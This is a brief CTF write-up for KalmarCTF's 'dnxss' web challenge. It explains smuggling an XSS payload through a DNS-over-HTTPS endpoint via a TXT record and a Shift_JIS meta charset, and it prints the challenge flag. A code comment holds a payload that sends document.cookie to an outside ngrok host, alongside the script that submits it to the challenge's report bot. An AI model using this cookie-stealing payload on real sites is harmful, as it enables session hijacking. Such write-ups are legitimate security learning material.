[KalmarCTF](https://ctftime.org/event/2599)

# dnxss (web)
`Content-Type text/html` does all the heavy lifting as the flag says.
But its missing the encoding type. So you have to add that on a `<meta>` tag.
Then the problem becomes the payload size. The way I solved was by adding a TXT record to my domain, calling `/cache` and using the raw dns query endpoint `/dns-query`. 
Then I just try out every enconding until some worked `Shift_JIS`. + Code from chatgpt.

## Solution

```python
import requests
import base64
import struct
import random

# <meta charset="Shift_JIS"><img src='x' onerror='fetch("https://bfb7-2804-1b3-8146-9228-4020-8696-f77a-6594.ngrok-free.app/" + btoa(document.cookie))'>
def send_txt_query(domain):
    query_id = random.randint(0, 65535)

    query_id_bytes = struct.pack(">H", query_id)

    header = query_id_bytes + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"

    domain_parts = domain.split(".")
    question = (
        b"".join(bytes([len(part)]) + part.encode() for part in domain_parts) + b"\x00"
    )

    question_type_class = b"\x00\x10\x00\x01"

    query = header + question + question_type_class

    q = query
    q = base64.b64encode(q).decode().replace("=", "")

    requests.post(
        "https://dnxss.chal-kalmarc.tf:443/report",
        headers={"Content-Type": "application/json"},
        json={"url":f"http://proxy/dns-query?dns={q}"},
        proxies={
            'http': 'http://0.0.0.0:8080',
            'https': 'https://0.0.0.0:8080'
        }, verify=False
    )

send_txt_query("fouz.com.br")
```

## Flag
`kalmar{that_content_type_header_is_doing_some_heavy_lifting!_did_you_use_dns-query_or_resolve?}`

shafouz 2025/03/08
